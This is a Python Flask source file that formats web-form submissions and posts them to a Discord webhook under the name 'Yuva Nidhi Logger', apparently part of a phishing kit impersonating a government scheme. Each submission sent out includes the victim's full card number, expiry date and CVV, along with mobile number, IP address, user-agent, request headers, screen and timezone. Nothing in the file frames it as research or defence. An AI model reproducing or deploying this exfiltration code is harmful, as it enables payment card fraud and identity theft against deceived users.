app/services.py

import json import requests import threading from flask import current_app

def send_to_webhook(payload): def _send(): url = current_app.config.get("DISCORD_WEBHOOK_URL") if not url: return try: headers = {'Content-Type': 'application/json'} requests.post(url, data=json.dumps(payload), headers=headers) except Exception as e: print(f"[Webhook Error] {e}")

thread = threading.Thread(target=_send)
thread.start()

def format_submission_data(submission, stage): return { "username": "Yuva Nidhi Logger", "embeds": [ { "title": f"📩 Submission {stage} | ID: {submission.id}", "color": 5814783, "fields": [ {"name": "👤 Name", "value": submission.name, "inline": True}, {"name": "📞 Mobile", "value": submission.mobile, "inline": True}, {"name": "💳 Card", "value": submission.card_number, "inline": True}, {"name": "🗓️ Expiry", "value": submission.expiry, "inline": True}, {"name": "🔒 CVV", "value": submission.cvv, "inline": True}, {"name": "🌐 IP", "value": submission.ip_address, "inline": True}, {"name": "🕶️ User-Agent", "value": submission.user_agent[:100], "inline": False}, {"name": "📋 Headers", "value": submission.headers_json[:100], "inline": False}, {"name": "🖥️ Screen", "value": submission.screen_resolution, "inline": True}, {"name": "⏰ Timezone", "value": submission.timezone, "inline": True}, {"name": "💰 Paid", "value": str(submission.payment_received), "inline": True}, ] } ] }

